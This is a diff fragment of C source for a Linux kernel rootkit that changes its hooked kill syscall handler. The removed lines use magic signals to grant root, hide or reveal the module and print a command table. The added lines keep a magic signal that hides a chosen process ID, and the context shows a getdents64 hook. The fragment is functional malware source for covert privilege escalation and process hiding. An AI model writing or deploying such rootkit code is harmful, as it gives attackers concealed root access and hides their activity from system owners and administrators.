@@ -164,70 +164,21 @@ done:
 
 }
 
-asmlinkage int hook_kill(pid_t pid, int sig)
+asmlinkage int hook_kill(const struct pt_regs *regs)
 {
-    if ( sig == 65 )
-    {
-
-    }
-    void set_root(void);
+    pid_t pid = regs->di;
+    int sig = regs->si;
 
     if ( sig == 64 )
     {
-        printk(KERN_INFO "rootkit: giving root...\n");
-        set_root();
-        return 0;
-    }
-
-    if ( sig == 63 )
-    {
+        /* If we receive the magic signal, then we just sprintf the pid
+         * from the intercepted arguments into the hide_pid string */
         printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
         sprintf(hide_pid, "%d", pid);
         return 0;
     }
-    void showme(void);
 
-    if ( sig == 62 )
-    {
-        if ( hidden == 1 )
-        {
-            printk(KERN_INFO "rootkit: showme enabled\n");
-            showme();
-        }
-        else
-        {
-            printk(KERN_INFO "rootkit: showme already enabled\n");
-        }
-        return 0;
-    }
-    void hideme(void);
-
-    if ( sig == 61 )
-    {
-        if ( hidden == 0 )
-        {
-            printk(KERN_INFO "rootkit: hideme enabled\n");
-            hideme();
-        }
-        else
-        {
-            printk(KERN_INFO "rootkit: hideme already enabled\n");
-        }
-        return 0;
-    }
-    if ( sig == 60 )
-    {
-        printk(KERN_INFO "SIG                    Description\n");
-        printk(KERN_INFO "---                    -----------\n");
-        printk(KERN_INFO "60                     prints this\n");
-        printk(KERN_INFO "61                     hides the rootkit (on by default)\n");
-        printk(KERN_INFO "62                     shows the rootkit\n");
-        printk(KERN_INFO "63                     hides a process based on the PID input of the kill command\n");
-        printk(KERN_INFO "64                     gives root\n");
-        return 0;
-    }
-
-    return orig_kill(pid, sig);
+    return orig_kill(regs);
 }
 #else
 static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
